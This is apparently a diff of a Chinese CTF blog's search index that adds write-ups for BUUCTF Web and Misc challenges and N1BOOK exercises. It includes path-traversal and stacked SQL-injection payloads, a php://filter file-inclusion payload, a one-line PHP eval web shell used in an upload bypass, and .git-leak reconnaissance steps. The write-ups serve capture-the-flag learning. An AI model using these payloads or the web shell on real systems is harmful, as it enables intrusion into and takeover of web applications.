@@ -4,6 +4,87 @@
   
     
     <entry>
+      <title>Buuctf之Web</title>
+      <link href="/2021/01/15/buuctf-zhi-web/"/>
+      <url>/2021/01/15/buuctf-zhi-web/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="第一题-HCTF-2018-WarmUp"><a href="#第一题-HCTF-2018-WarmUp" class="headerlink" title="第一题:[HCTF 2018]WarmUp"></a>第一题:[HCTF 2018]WarmUp</h2><p>这里懒得上传图片了，所以就直接笔记了</p><p>源代码里面有1.source.php，所以打开以后还会发先2.hint.php</p><p>1打开后会发现是代码审计</p><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;                /**isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误。is_string用来检查传入的值是否为字符串**/            }            if (in_array($page, $whitelist)) {                return true;                /**in_array — 检查数组中是否存在某个值，这里判断page是否存在于whitelist数 组 中 ， 存 在 则 返 回 true**/            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            /**            对mb_substr函数的解释：函数返回字符串的一部分，针对中文            &lt;?php               echo mb_substr(&quot;菜鸟教程&quot;, 0, 2);               // 输出：菜鸟            ?&gt;            mb_strpos (要被检查的字符串,要搜索的字符串)            &lt;?php             $str = &#39;http://www.feiniaomy.com&#39;;             echo mb_strpos($str,&#39;niao&#39;);            ?&gt;            输出结果：14            这里整个嵌套意思是截取page中’?‘前部分             **/            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            /**            这里也就是说进行了两次url解码，一次是服务器自动解码，一次是此处解码            **/            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])#这段代码意思就是响应的file参数不能为空，而且必须是是字符串，并且还要检查在checkfile里面检查，这里将我们的的值传到emmm类里面的checkFile函数，这三个值通过&amp;&amp;逻辑与运算符连接也就是要求这块函数的返回值要全为真才能执行if里面的文件包含的代码 否则就执行else里面的图片代码#    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>2打开后会发现：flag not here, and flag in ffffllllaaaagggg</p><p>也就是说flag在这个文件里面</p><p>所以说这个经过分析完以后，tmd这个题就很简单了，就是老结构/?file=source.php?/../../../../ffffllllaaaagggg</p><p>然后就是对？进行url编码%253F这里../就是</p><p>所以就是/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p><p>同样/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg都可以</p><p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p><p>没什么东西</p><p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}</code></pre><p>输入1’</p><pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p><p>输入：1’ or 1=1#</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}array(2) {  [0]=&gt;  string(1) &quot;2&quot;  [1]=&gt;  string(12) &quot;miaomiaomiao&quot;}array(2) {  [0]=&gt;  string(6) &quot;114514&quot;  [1]=&gt;  string(2) &quot;ys&quot;}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p><p>输入：1’ union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p><p>考虑堆叠注入（学到了）：</p><p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p><p>输入：1’;show databases;#</p><pre><code>array(1) {  [0]=&gt;  string(11) &quot;ctftraining&quot;}array(1) {  [0]=&gt;  string(18) &quot;information_schema&quot;}array(1) {  [0]=&gt;  string(5) &quot;mysql&quot;}array(1) {  [0]=&gt;  string(18) &quot;performance_schema&quot;}array(1) {  [0]=&gt;  string(9) &quot;supersqli&quot;}array(1) {  [0]=&gt;  string(4) &quot;test&quot;}</code></pre><p>输入：1’;show tables from supersqli;#</p><pre><code>array(1) {  [0]=&gt;  string(16) &quot;1919810931114514&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><p>输入：1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p><pre><code>array(6) {  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>输入：1’;show columns from words;#</p><pre><code>array(6) {  [0]=&gt;  string(2) &quot;id&quot;  [1]=&gt;  string(7) &quot;int(10)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}array(6) {  [0]=&gt;  string(4) &quot;data&quot;  [1]=&gt;  string(11) &quot;varchar(20)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>1’;rename tables <code>words</code> to <code>words1</code>;rename tables <code>1919810931114514</code> to <code>words</code>; alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#</p><p>然后1’ or 1=1#</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p><p>特点：文件包含，/?file=flag.php</p><p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p><p>base64得：</p><pre><code>&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>小马：</p><pre><code>GIF89a&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>首先上传.php文件发现对后缀进行了限制</p><p>改为shell.php.png同时抓包删除png</p><p>得到一个页面以后查看源代码发现：</p><p>Upload Success! Look here~ ./uplo4d/3d694425bf5c9803db0c7b3d776cd2f1.png</p><p>发现确实存在，但是被重命名了，而且变成了一个png</p><p>重新尝试后缀绕过shell.phtml（通过抓包修改）</p><p>得到：</p><p>Upload Success! Look here~ ./uplo4d/bd914ca4997d34857501cefab0064162.phtml</p><p>回到根目录查看flag即可</p><p>或者数据终端cat /flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> web </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Buuctf之Misc</title>
+      <link href="/2021/01/15/buuctf-zhi-misc/"/>
+      <url>/2021/01/15/buuctf-zhi-misc/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2021-1-15"><a href="#2021-1-15" class="headerlink" title="2021/1/15"></a>2021/1/15</h1><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>下载得到QR_code.png图片，扫码得到secret is here，但并非flag。</p><p>但是这个图片的大小却是600多个kb，所以怀疑是压缩包文件，改个后缀zip打开发现有密码</p><p>因为文件名字是4number所以爆破得到密码7639，解压得到flag：CTF{vjpw_wnoei}</p><p>改为flag{vjpw_wnoei}提交成功</p><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>也是一个改后缀的题，改为txt得到</p><pre><code>data:image/jpg;base64,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</code></pre><p>要是我记得没错应该是base64和图片的转换，得到二维码一张扫一下得：KEY{dca57f966e4e4e31fd5b15417da63269}</p><p>flag{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>提示：看不到图？ 是不是屏幕太小了 </p><p>意思就是说这个图下面还有一半没显示出来</p><p>用winhex打开</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8815%E6%97%A51825_1.png" alt></p><p>将67改为与23相同的02和A7（修改高度和宽度相同）然后得到flag{He1l0_d4_ba1}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> misc </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>N1BOOK</title>
+      <link href="/2021/01/15/n1book/"/>
+      <url>/2021/01/15/n1book/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p><p>Git测试</p><p>Hello, CTFer!</p><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><hr><p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><p>看网上说这是git测试，听别人看书说要用一个工具叫：scrabble，但是我没有书，所以我就不和他用一样的工具：Githack</p><p>kali没有自己下载：</p><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.git</code></pre><p>然后就发现<img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50926_2.png" alt></p><p>打开以后</p><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20%E5%B9%B412%E6%9C%8823%E6%97%A50927_3.png" alt></p><p>n1book{git_looks_s0_easyfun}</p><p>完事了</p><p>关于书上记载的关于githack的命令：</p><p>git log -all或git branch -v（看到master分支信息）</p><p>git reflog（看到一些checkout记录）</p><h2 id="常见的搜集"><a href="#常见的搜集" class="headerlink" title="常见的搜集"></a>常见的搜集</h2><h4 id="知识经验总结："><a href="#知识经验总结：" class="headerlink" title="知识经验总结："></a>知识经验总结：</h4><p><strong>常规文件</strong>：</p><ul><li>robots.txt记录一些目录和CMS版本信息</li><li>readme.md：记录CMS版本信息，有的甚至有github地址</li><li><a href="http://www.zip/rar/tar.gz：往往是网站的源码备份" target="_blank" rel="noopener">www.zip/rar/tar.gz：往往是网站的源码备份</a></li></ul><p><strong>vim备份文件</strong>：</p><p>第一次意外退出的备份文件为.flag.swp</p><p>第二次.flag.swo</p><p>第三次.flag.swn以此类推</p><p>实际环境环境中，网站的备份往往可能是网站域名的压缩包</p><p><strong>gedit备份文件</strong>：</p><p>gedit编辑器保存后，当前目录会生成一个后缀<del>的文件就比如flag</del></p><p>关于此题：</p><p>先访问/robots.txt文件得到：/flag1_is_her3_fun.txt访问得到：flag1:n1book{info_1</p><p>再试试<a href="http://www.zip发现没有什么结果" target="_blank" rel="noopener">www.zip发现没有什么结果</a></p><p>再试试index.php~</p><p>得flag2:s_v3ry_im</p><p>准备下载.index.php.swp</p><p>将后缀改为txt文件打开发现：</p><p>flag3:p0rtant_hack}</p><p>拼凑在一起齐了：n1book{info_1s_v3ry_imp0rtant_hack}</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> buuctf </tag>
+            
+            <tag> 从0到1ctfer </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>千锋资源</title>
       <link href="/2021/01/14/qian-feng-zi-yuan/"/>
       <url>/2021/01/14/qian-feng-zi-yuan/</url>
@@ -177,33 +258,6 @@
             <tag> 入门 </tag>
             
             <tag> ctfhub </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>Buuctf笔记</title>
-      <link href="/2020/12/21/buuctf-bi-ji/"/>
-      <url>/2020/12/21/buuctf-bi-ji/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="第一题-HCTF-2018-WarmUp"><a href="#第一题-HCTF-2018-WarmUp" class="headerlink" title="第一题:[HCTF 2018]WarmUp"></a>第一题:[HCTF 2018]WarmUp</h2><p>这里懒得上传图片了，所以就直接笔记了</p><p>源代码里面有1.source.php，所以打开以后还会发先2.hint.php</p><p>1打开后会发现是代码审计</p><pre><code>&lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;                /**isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误。is_string用来检查传入的值是否为字符串**/            }            if (in_array($page, $whitelist)) {                return true;                /**in_array — 检查数组中是否存在某个值，这里判断page是否存在于whitelist数 组 中 ， 存 在 则 返 回 true**/            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );            /**            对mb_substr函数的解释：函数返回字符串的一部分，针对中文            &lt;?php               echo mb_substr(&quot;菜鸟教程&quot;, 0, 2);               // 输出：菜鸟            ?&gt;            mb_strpos (要被检查的字符串,要搜索的字符串)            &lt;?php             $str = &#39;http://www.feiniaomy.com&#39;;             echo mb_strpos($str,&#39;niao&#39;);            ?&gt;            输出结果：14            这里整个嵌套意思是截取page中’?‘前部分             **/            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            /**            这里也就是说进行了两次url解码，一次是服务器自动解码，一次是此处解码            **/            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])#这段代码意思就是响应的file参数不能为空，而且必须是是字符串，并且还要检查在checkfile里面检查，这里将我们的的值传到emmm类里面的checkFile函数，这三个值通过&amp;&amp;逻辑与运算符连接也就是要求这块函数的返回值要全为真才能执行if里面的文件包含的代码 否则就执行else里面的图片代码#    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p>2打开后会发现：flag not here, and flag in ffffllllaaaagggg</p><p>也就是说flag在这个文件里面</p><p>所以说这个经过分析完以后，tmd这个题就很简单了，就是老结构/?file=source.php?/../../../../ffffllllaaaagggg</p><p>然后就是对？进行url编码%253F这里../就是</p><p>所以就是/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p><p>同样/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg都可以</p><p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p><p>没什么东西</p><p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}</code></pre><p>输入1’</p><pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p><p>输入：1’ or 1=1#</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}array(2) {  [0]=&gt;  string(1) &quot;2&quot;  [1]=&gt;  string(12) &quot;miaomiaomiao&quot;}array(2) {  [0]=&gt;  string(6) &quot;114514&quot;  [1]=&gt;  string(2) &quot;ys&quot;}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p><p>输入：1’ union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p><p>考虑堆叠注入（学到了）：</p><p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p><p>输入：1’;show databases;#</p><pre><code>array(1) {  [0]=&gt;  string(11) &quot;ctftraining&quot;}array(1) {  [0]=&gt;  string(18) &quot;information_schema&quot;}array(1) {  [0]=&gt;  string(5) &quot;mysql&quot;}array(1) {  [0]=&gt;  string(18) &quot;performance_schema&quot;}array(1) {  [0]=&gt;  string(9) &quot;supersqli&quot;}array(1) {  [0]=&gt;  string(4) &quot;test&quot;}</code></pre><p>输入：1’;show tables from supersqli;#</p><pre><code>array(1) {  [0]=&gt;  string(16) &quot;1919810931114514&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><p>输入：1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p><pre><code>array(6) {  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>输入：1’;show columns from words;#</p><pre><code>array(6) {  [0]=&gt;  string(2) &quot;id&quot;  [1]=&gt;  string(7) &quot;int(10)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}array(6) {  [0]=&gt;  string(4) &quot;data&quot;  [1]=&gt;  string(11) &quot;varchar(20)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>1’;rename tables <code>words</code> to <code>words1</code>;rename tables <code>1919810931114514</code> to <code>words</code>; alter table <code>words</code> change <code>flag</code> <code>id</code> varchar(100);#</p><p>然后1’ or 1=1#</p><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>php伪协议</p><p>特点：文件包含，/?file=flag.php</p><p>payload:file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>得：PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzEyOTZhNWUtZjRiMy00ZTY1LTg5MGEtOThjNjZhMWU5MWI0fQo=</p><p>base64得：</p><pre><code>&lt;?phpecho &quot;Can you find out the flag?&quot;;//flag{31296a5e-f4b3-4e65-890a-98c66a1e91b4}</code></pre><h1 id="N1book"><a href="#N1book" class="headerlink" title="N1book"></a>N1book</h1><h2 id="第一章-web入门"><a href="#第一章-web入门" class="headerlink" title="[第一章 web入门]"></a>[第一章 web入门]</h2><h3 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h3><p>题目：</p><p>Git测试</p><p>Hello, CTFer!</p><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><hr><p>小李好像不是很小心，经过了几次迭代更新就直接就把整个文件夹放到线上环境了:(</p><p>very easy</p><p>看网上说这是git测试，听别人看书说要用一个工具叫：scrabble，但是我没有书，所以我就不和他用一样的工具：Githack</p><p>kali没有自己下载：</p><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://24015196-5385-41b6-9b92-02d1bdc92971.node3.buuoj.cn/.git</code></pre><p>然后就发现<img 